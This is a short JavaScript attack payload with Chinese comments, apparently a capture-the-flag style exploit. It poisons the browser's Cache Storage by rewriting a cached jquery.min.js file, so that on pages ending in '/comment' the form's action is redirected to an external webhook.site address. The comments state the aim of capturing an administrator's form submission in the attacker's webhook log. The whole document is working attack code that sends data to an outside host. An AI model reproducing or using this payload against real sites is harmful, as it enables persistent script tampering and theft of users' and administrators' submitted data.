(async () => {
    let e = "/static/js/jquery.min.js", // 注意使用绝对路径，这个路径是 jQuery 的缓存路径
        t = await caches.open("static-resources"),  // 打开缓存
        a = await t.match(e),   //  查找缓存中是否存在这个文件
        s = await a.text();     //  获取文件内容
    await t.put(e, 
				new Response(
		s.replace("jQuery=C.$=S),S});",
        `jQuery=C.$=S),S});$(document).ready(function() {if(document.URL.endsWith('/comment')){document.forms[0].action='https://webhook.site/f173aa95-d737-46ff-bbcd-7a659bd2515a'}});`),  // 随便找 jquery 文件里的一行内容进行替换，hook comment 路径的表单 action ，当 admin 提交的时候就会提交到我们的 webhook http log 上了
        {
            status: 200,
            statusText: "OK",
            headers: a.headers
        }))
})();